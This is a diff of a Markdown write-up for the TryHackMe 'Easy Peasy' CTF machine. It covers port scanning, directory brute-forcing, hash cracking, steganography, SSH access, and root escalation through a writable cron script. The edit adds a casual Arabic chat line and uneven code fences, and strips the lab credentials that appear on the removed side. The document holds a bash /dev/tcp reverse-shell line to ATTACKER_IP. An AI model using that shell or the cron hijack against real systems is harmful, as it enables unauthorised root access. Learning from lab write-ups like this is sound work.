@@ -1,3 +1,6 @@
+أكيد 😭❤️ هذا **كله في مربع واحد** عشان تنسخينه دفعة وحدة:
+
+````markdown
 # Easy Peasy - TryHackMe
 
 ## Overview
@@ -12,11 +15,11 @@ Easy Peasy is a beginner-friendly Linux machine that covers multiple penetration
 
 ```bash
 nmap -p- <TARGET_IP>
-```
+````
 
 ### Result
 
-```
+```text
 80/tcp     HTTP (Nginx)
 6498/tcp   SSH
 65524/tcp  HTTP (Apache)
@@ -30,11 +33,11 @@ nmap -p- <TARGET_IP>
 nmap -sC -sV -p 80,6498,65524 <TARGET_IP>
 ```
 
-This confirms:
+This confirmed:
 
-- Nginx web server on port 80
-- OpenSSH on port 6498
-- Apache web server on port 65524
+* Nginx web server on port 80
+* OpenSSH on port 6498
+* Apache web server on port 65524
 
 ---
 
@@ -47,284 +50,224 @@ gobuster dir -u http://<TARGET_IP>/ \
 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Discovered directory:
+A hidden directory was discovered:
 
-```
+```text
 /hidden
 ```
 
-Continue enumeration.
+Further enumeration was performed:
 
 ```bash
 gobuster dir -u http://<TARGET_IP>/hidden/ \
 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Discovered:
+Another hidden path was discovered.
 
-```
-/whatever
-```
+Viewing the page source revealed a Base64-encoded string.
 
-Viewing the page source revealed a Base64 encoded string.
-
-Decode it using:
+The string was decoded using:
 
 ```bash
 echo "<BASE64_STRING>" | base64 -d
 ```
 
-Successfully recovered **Flag 1**.
+This successfully recovered the first flag.
 
 ---
 
 # Port 65524 Enumeration
 
-Visit:
+The web service was accessed at:
 
-```
+```text
 http://<TARGET_IP>:65524
 ```
 
-Viewing the page source reveals another encoded string.
+Viewing the page source revealed another encoded string.
 
-```
-ObsJmP173N2X6dOrAgEAL0Vu
-```
-
-The string was decoded using **CyberChef (Base62)**.
-
-Recovered hidden directory:
-
-```
-/n0th1ng3ls3m4tt3r/
-```
+The value was decoded using **CyberChef with Base62 decoding**, which revealed a hidden directory.
 
 ---
 
 # Hidden Directory Analysis
 
-Visit:
+The discovered directory contained:
 
-```
-http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/
-```
+* An image
+* A GOST hash
 
-The page contains:
-
-- An image
-- A GOST hash
-
-Download the image.
+The image was downloaded using:
 
 ```bash
-wget http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+wget http://<TARGET_IP>:65524/<HIDDEN_PATH>/binarycodepixabay.jpg
 ```
 
 ---
 
 # Hash Cracking
 
-Save the hash.
+The discovered hash was saved to a file:
 
 ```bash
 echo "<GOST_HASH>" > hash.txt
 ```
 
-Crack the hash using John the Ripper.
+John the Ripper was then used to crack the hash:
 
 ```bash
 john --wordlist=easypeasy.txt \
 --format=gost hash.txt
 ```
 
-Display the recovered password.
-
-```bash
-john --show hash.txt
-```
-
-Recovered passphrase:
-
-```
-mypasswordforthatjob
-```
+The recovered passphrase was then used during the next stage of the investigation.
 
 ---
 
 # Steganography
 
-Extract the hidden content from the image.
+The downloaded image was analyzed for hidden content using Steghide:
 
 ```bash
 steghide extract -sf binarycodepixabay.jpg
 ```
 
-Enter the recovered passphrase:
-
-```
-mypasswordforthatjob
-```
+The recovered passphrase was provided when prompted.
 
 A file named:
 
-```
+```text
 secrettext.txt
 ```
 
-is extracted.
+was extracted.
 
-Contents:
+The file contained a username and a password stored in binary format.
 
-```
-username: boring
-password: <binary>
-```
-
-The password is stored as binary and must be converted into plain text.
-
-Recovered credentials:
-
-```
-Username: boring
-Password: iconvertedmypasswordtobinary
-```
+The binary value was converted into plain text, providing credentials for SSH access.
 
 ---
 
 # SSH Access
 
-Connect using SSH.
+The recovered credentials were used to authenticate to the SSH service:
 
 ```bash
-ssh boring@<TARGET_IP> -p 6498
+ssh <USERNAME>@<TARGET_IP> -p 6498
 ```
 
 ---
 
 # User Enumeration
 
-List files.
+After obtaining SSH access, local files were enumerated:
 
 ```bash
 ls -la
 ```
 
-Read the user flag.
+The user flag was located in the home directory.
 
-```bash
-cat user.txt
-```
-
-The flag is encoded using **ROT13**.
-
-Decode using:
+The provided value was encoded using ROT13 and was decoded with:
 
 ```bash
 echo "<ROT13_TEXT>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 
-Recovered the User Flag.
+This successfully recovered the user flag.
 
 ---
 
 # Privilege Escalation
 
-Inspect scheduled tasks.
+Scheduled tasks were inspected using:
 
 ```bash
 cat /etc/crontab
 ```
 
-Interesting cron job:
+An interesting cron job was identified:
 
 ```text
 * * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
 ```
 
-Inspect the script.
+The referenced script was inspected:
 
 ```bash
 cat /var/www/.mysecretcronjob.sh
 ```
 
-Check permissions.
+Its permissions were then checked:
 
 ```bash
 ls -l /var/www/.mysecretcronjob.sh
 ```
 
-The script is writable by the current user while being executed as **root** every minute.
+The script was writable by the current user while being executed as root every minute.
 
-Start a listener.
+This created a privilege escalation opportunity.
+
+A Netcat listener was started:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Append a reverse shell.
+A reverse shell was then appended to the writable script:
 
 ```bash
 echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /var/www/.mysecretcronjob.sh
 ```
 
-Wait for the cron job to execute.
+After the cron job executed, a reverse shell was received with root privileges.
 
-Once the reverse shell connects:
+The privileges were verified using:
 
 ```bash
 id
 ```
 
-Output:
+The output confirmed root access:
 
-```
+```text
 uid=0(root)
 ```
 
-Navigate to the root directory.
-
-```bash
-cd /root
-ls -la
-cat .root.txt
-```
-
-Successfully recovered the Root Flag.
+The root directory was then accessed and the root flag was recovered.
 
 ---
 
 # Skills Practiced
 
-- Nmap Enumeration
-- Service Detection
-- Gobuster Directory Enumeration
-- robots.txt Analysis
-- HTML Source Code Review
-- Base64 Decoding
-- Base62 Decoding
-- MD5 Identification
-- GOST Hash Cracking
-- John the Ripper
-- Steganography
-- Binary Decoding
-- SSH Authentication
-- ROT13 Decoding
-- Linux Enumeration
-- Cron Job Privilege Escalation
+* Nmap Enumeration
+* Service Detection
+* Gobuster Directory Enumeration
+* HTML Source Code Analysis
+* Base64 Decoding
+* Base62 Decoding
+* GOST Hash Cracking
+* John the Ripper
+* Steganography
+* Binary Decoding
+* SSH Authentication
+* ROT13 Decoding
+* Linux Enumeration
+* Cron Job Privilege Escalation
 
 ---
 
 # Key Takeaways
 
-- Always perform a full TCP port scan.
-- Enumerate every exposed web service independently.
-- Never ignore page source or robots.txt.
-- Identify encoding before decoding.
-- Identify hash type before attempting to crack it.
-- Images may contain hidden information.
-- Enumerate cron jobs after obtaining shell access.
-- Writable scripts executed by root can lead to full system compromise.
+* Always perform a full TCP port scan.
+* Enumerate every exposed web service independently.
+* Review page source when investigating web applications.
+* Identify the encoding or data format before attempting to decode it.
+* Identify the hash type before attempting to crack it.
+* Images may contain hidden information.
+* Enumerate scheduled tasks after obtaining shell access.
+* Writable scripts executed with elevated privileges can lead to full system compromise.
 
 ---
 
@@ -335,3 +278,6 @@ Successfully recovered the Root Flag.
 **Difficulty:** Easy
 
 **Techniques:** Enumeration, Web Exploitation, Hash Cracking, Steganography, SSH, Linux Privilege Escalation
+
+```
+```
